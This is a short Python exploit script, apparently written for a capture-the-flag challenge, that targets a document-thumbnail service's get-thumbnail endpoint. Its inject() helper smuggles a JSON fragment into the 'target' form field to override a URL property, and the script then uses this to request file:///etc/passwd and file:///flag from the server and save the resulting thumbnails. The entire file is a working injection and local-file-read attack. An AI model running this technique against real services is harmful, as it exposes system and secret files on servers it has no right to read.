#!/usr/bin/env python3
"""Temporary CTF get-thumbnail target JSON-injection probe."""
import pathlib
import urllib.error
import urllib.request
import uuid

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
OUT = pathlib.Path(__file__).parent


def thumbnail(target, label):
    data = b"ARENA_ORIGINAL_DOCUMENT\nsecond line\n"
    boundary = "----Arena" + uuid.uuid4().hex
    parts = [f"--{boundary}\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\n{target}\r\n".encode()]
    parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"document.txt\"\r\nContent-Type: text/plain\r\n\r\n".encode())
    parts.append(data)
    parts.append(f"\r\n--{boundary}--\r\n".encode())
    req = urllib.request.Request(BASE + "/cool/get-thumbnail", data=b"".join(parts), method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, "TARGET", repr(target), flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(5000000)
            print("STATUS", r.status, "TYPE", r.headers.get("Content-Type"), "BYTES", len(raw), "PNG", raw.startswith(b"\x89PNG"), flush=True)
            if raw.startswith(b"\x89PNG"):
                path = OUT / ("thumb_" + label + ".png")
                path.write_bytes(raw)
                print("SAVED", path.name, flush=True)
            else:
                print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


def inject(url):
    return '"},"URL":{"type":"string","value":"' + url


thumbnail("", "control")
thumbnail(inject("file:///etc/passwd"), "passwd")
thumbnail(inject("file:///flag"), "flag")
